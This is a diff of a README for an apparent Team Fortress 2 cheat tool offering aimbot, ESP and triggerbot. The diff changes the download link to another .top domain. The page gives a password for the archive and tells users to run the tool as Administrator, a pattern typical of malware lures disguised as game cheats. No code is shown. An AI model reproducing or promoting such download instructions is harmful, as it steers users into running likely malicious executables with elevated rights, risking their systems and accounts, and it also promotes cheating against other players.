@@ -6,7 +6,7 @@ Team Fortress 2 external hack featuring ESP, aimbot, glow, radar, and triggerbot
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular open-source projects like **AimTux** and **Linux-Hack**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Team Fortress 2.
 4. Run the hack **as Administrator**.
